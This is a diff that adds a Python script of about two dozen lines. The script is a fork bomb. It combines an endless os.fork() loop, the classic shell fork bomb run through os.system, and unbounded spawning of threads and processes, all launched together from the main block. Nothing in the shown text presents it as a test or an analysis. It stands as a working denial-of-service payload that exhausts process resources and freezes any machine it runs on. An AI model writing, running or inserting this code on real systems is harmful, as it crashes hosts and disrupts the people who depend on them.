@@ -1,0 +1,26 @@
+#! /usr/bin/python3
+
+import os
+import threading
+import multiprocessing
+
+def fork_bomb():
+    while True:
+        os.fork()
+
+def run_fork_bomb():
+    while True:
+        os.system(":(){ :|: & };:")
+
+def thread_fork_bomb():
+    while True:
+        threading.Thread(target=fork_bomb).start()
+
+def process_fork_bomb():
+    while True:
+        multiprocessing.Process(target=fork_bomb).start()
+
+if __name__ == "__main__":
+    threading.Thread(target=run_fork_bomb).start()
+    threading.Thread(target=thread_fork_bomb).start()
+    multiprocessing.Process(target=process_fork_bomb).start()
